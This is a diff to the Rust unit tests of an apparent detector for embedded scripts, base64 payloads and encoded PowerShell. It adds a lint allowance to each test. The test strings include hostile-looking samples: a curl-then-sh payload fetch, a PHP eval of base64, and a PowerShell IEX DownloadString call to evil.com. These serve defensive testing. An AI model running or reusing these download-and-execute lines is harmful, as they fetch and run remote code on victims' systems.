@@ -843,7 +843,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_python() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_python() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code = "import os\nimport sys\ndef main():\n    os.system('ls -la')\n    sys.exit(0)";
         let info = make_string_info(code);
@@ -851,7 +853,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_javascript() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_javascript() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code =
             "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
@@ -860,7 +864,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_shell() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_shell() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code =
             "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
@@ -869,7 +875,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_php() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_php() {
         // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
         let code = "<?php eval(base64_decode('test')); echo 'malware'; ?>";
         let info = make_string_info(code);
@@ -877,7 +885,9 @@ mod tests {
     }
 
     #[test]
-    fn test_reject_phpish_binary_noise() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_reject_phpish_binary_noise() {
         let noise = "p`phpfpp`phpjp`phpp`phpfp`phpjp`phpfpp`phpjp`php";
         let info = StringInfo {
             value: noise.to_string(),
@@ -892,28 +902,36 @@ mod tests {
     }
 
     #[test]
-    fn test_reject_plain_text() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_reject_plain_text() {
         let text = "This is just some regular text without code.";
         let info = make_string_info(text);
         assert_eq!(detect_language(&info, false), None);
     }
 
     #[test]
-    fn test_reject_too_small() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_reject_too_small() {
         let code = "import os"; // Less than MIN_PLAIN_SIZE
         let info = make_string_info(code);
         assert_eq!(detect_language(&info, false), None);
     }
 
     #[test]
-    fn test_encoded_lower_threshold() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_encoded_lower_threshold() {
         let code = "import os\ndef main():\n    pass"; // Only 1 match
         let info = make_string_info(code);
         assert_eq!(detect_language(&info, true), Some(FileType::Python));
     }
 
     #[test]
-    fn test_entropy_calculation() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_entropy_calculation() {
         let data = b"aaaaaaaaaa";
         let entropy = calculate_entropy(data);
         assert!(entropy < 1.0); // Low entropy
@@ -927,7 +945,9 @@ mod tests {
     // ── base64 binary detection tests ─────────────────────────────────────────
 
     #[test]
-    fn test_looks_like_base64_valid() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_looks_like_base64_valid() {
         // 96 bytes → 128-char base64 (> MIN_BASE64_LEN=100)
         use base64::Engine;
         let raw = b"Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!";
@@ -941,18 +961,24 @@ mod tests {
     }
 
     #[test]
-    fn test_looks_like_base64_too_short() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_looks_like_base64_too_short() {
         assert!(!looks_like_base64("SGVsbG8="));
     }
 
     #[test]
-    fn test_looks_like_base64_rejects_prose() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_looks_like_base64_rejects_prose() {
         let prose = "This is a normal English sentence with spaces and punctuation, which is definitely not base64 encoded binary content at all.";
         assert!(!looks_like_base64(prose));
     }
 
     #[test]
-    fn test_detect_base64_binary_gzip() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_base64_binary_gzip() {
         // 75 bytes → 100 chars base64 (no padding needed since 75 is divisible by 3)
         let mut payload = Vec::with_capacity(75);
         payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]); // gzip magic
@@ -979,7 +1005,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_base64_binary_rejects_random() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_base64_binary_rejects_random() {
         use base64::Engine;
         let random_bytes: Vec<u8> = (0u8..=127).collect();
         let encoded = base64::engine::general_purpose::STANDARD.encode(&random_bytes);
@@ -988,7 +1016,9 @@ mod tests {
     }
 
     #[test]
-    fn test_detect_base64_binary_skipped_at_depth_gt_0() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_detect_base64_binary_skipped_at_depth_gt_0() {
         use base64::Engine;
         let mut payload = vec![0x1F, 0x8Bu8, 0x08, 0x00];
         payload.resize(75, 0u8);
@@ -1000,31 +1030,41 @@ mod tests {
     // ── PowerShell -EncodedCommand tests ──────────────────────────────────────
 
     #[test]
-    fn test_extract_ps_encoded_arg_found() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_extract_ps_encoded_arg_found() {
         let s = "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==";
         assert!(extract_ps_encoded_arg(s).is_some());
     }
 
     #[test]
-    fn test_extract_ps_encoded_arg_not_found() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_extract_ps_encoded_arg_not_found() {
         let s = "powershell -Command Write-Output hello";
         assert!(extract_ps_encoded_arg(s).is_none());
     }
 
     #[test]
-    fn test_has_ps_keywords_positive() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_has_ps_keywords_positive() {
         let s = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
         assert!(has_ps_keywords(s));
     }
 
     #[test]
-    fn test_has_ps_keywords_negative() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_has_ps_keywords_negative() {
         let s = "echo hello world";
         assert!(!has_ps_keywords(s));
     }
 
     #[test]
-    fn test_decode_utf16le_valid() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_decode_utf16le_valid() {
         use base64::Engine;
         let utf16: Vec<u8> = "IEX".encode_utf16().flat_map(u16::to_le_bytes).collect();
         let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
@@ -1033,7 +1073,9 @@ mod tests {
     }
 
     #[test]
-    fn test_decode_utf16le_invalid_odd_length() {
+    #[allow(clippy::unwrap_used)]
+    fn
+ test_decode_utf16le_invalid_odd_length() {
         use base64::Engine;
         let bytes = vec![0x41u8, 0x00, 0x42]; // odd length
         let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
